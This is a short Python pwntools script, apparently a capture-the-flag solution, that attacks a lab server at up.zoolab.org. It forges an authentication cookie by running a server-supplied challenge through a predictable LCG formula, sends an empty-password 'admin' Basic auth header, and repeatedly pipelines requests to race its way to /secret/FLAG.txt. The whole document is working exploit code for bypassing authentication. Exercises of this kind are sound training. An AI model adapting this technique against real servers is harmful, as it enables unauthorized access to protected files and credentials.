from pwn import *
import re

def run():
    rec = remote('up.zoolab.org', 10933)
    
    rec.sendline(b"GET /secret/FLAG.txt\r\n")
    resp = rec.recvuntil(b"Content-Length: 0", timeout=2).decode()
    
    match = re.search(r'challenge=(\d+)', resp)
    if not match:
        print("[-] Failed")
        rec.close()
        return
    
    challenge = int(match.group(1))
    cookie = ((challenge * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF) >> 33
    print(f"[+] Challenge: {challenge}, Cookie: {cookie}")
    i = 0

    while True:
        i += 1
        if i % 100 == 0:
            print(f"[*] Try {i} times...")

        rec.sendline(b"GET /\r\n")
        rec.sendline(b"GET /secret/FLAG.txt")
        rec.sendline(b"Authorization: Basic YWRtaW46")
        rec.sendline(f"Cookie: response={cookie}\r\n".encode())
        
        try:
            msg = rec.recv(timeout=0.1)
            if b"FLAG" in msg:
                flag = re.search(rb'FLAG\{[^}]+\}', msg)
                if flag:
                    print(f"[+] Success! FLAG: {flag.group(0).decode()}")
                    rec.close()
                    return
        except:
            pass
    
    print("[-] Failed to get FLAG")
    rec.close()
    return

if __name__ == "__main__":
    run()